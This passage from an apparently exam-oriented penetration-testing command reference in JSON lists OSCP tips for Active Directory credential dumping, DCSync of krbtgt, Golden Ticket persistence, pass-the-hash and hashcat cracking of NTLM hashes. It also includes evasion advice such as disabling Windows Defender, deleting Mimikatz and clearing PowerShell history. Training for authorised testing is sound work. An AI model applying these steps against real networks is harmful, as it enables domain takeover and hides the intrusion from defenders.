          "Prefer Linux tools (Impacket) over Windows tools (Mimikatz) - no AV alerts on compromised endpoints",
          "After extracting krbtgt, delete Mimikatz binary and clear PowerShell history",
          "Use Golden Ticket sparingly - each use generates Kerberos authentication logs"
        ]
      },
      "oscp_exam_tips": [
        "ALWAYS DCSync krbtgt FIRST after achieving Domain Admin - this is your insurance policy",
        "Use single quotes around impacket auth string to handle special characters: 'domain/user:P@ss!@dc'",
        "Start hash cracking in background immediately: hashcat -m 1000 hashes.txt rockyou.txt & disown",
        "Use Pass-the-Hash while cracking runs - don't wait for plaintext passwords",
        "Prefer impacket-secretsdump over Mimikatz for OSCP (no Windows AV issues, cleaner output)",
        "Save all extracted hashes externally (text file on Kali) in case of session loss",
        "Document DC IP, Domain FQDN, Domain SID immediately - needed for Golden Ticket",
        "Test connectivity to DC BEFORE attempting DCSync (save time on troubleshooting)",
        "If Mimikatz blocked by AV: Disable Windows Defender OR use impacket-secretsdump from Kali",
        "For lateral movement: Use wmiexec instead of psexec (less noisy, no service creation)",
        "Time estimate for DA→Golden Ticket: 5-10 minutes total (DCSync krbtgt + create ticket)",
        "Remember: NTLM hash alone is sufficient for Windows auth - password cracking is optional"
      ],
      "related_commands": [
        "ad-dcsync-check-user-groups",
        "ad-dcsync-check-domain-admins",
        "ad-dcsync-secretsdump-user",
        "ad-dcsync-secretsdump-krbtgt",
        "ad-dcsync-mimikatz-user",
        "ad-dcsync-mimikatz-krbtgt",
        "ad-golden-ticket-mimikatz-create",
        "ad-pass-the-hash-impacket-psexec",
        "windows-hashcat-crack-ntlm"
      ],
      "tags": [
        "OSCP:HIGH",
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "POST_EXPLOITATION",
        "METHODOLOGY",
        "PERSISTENCE",
        "GOLDEN_TICKET"
      ]
    }
  ]
}
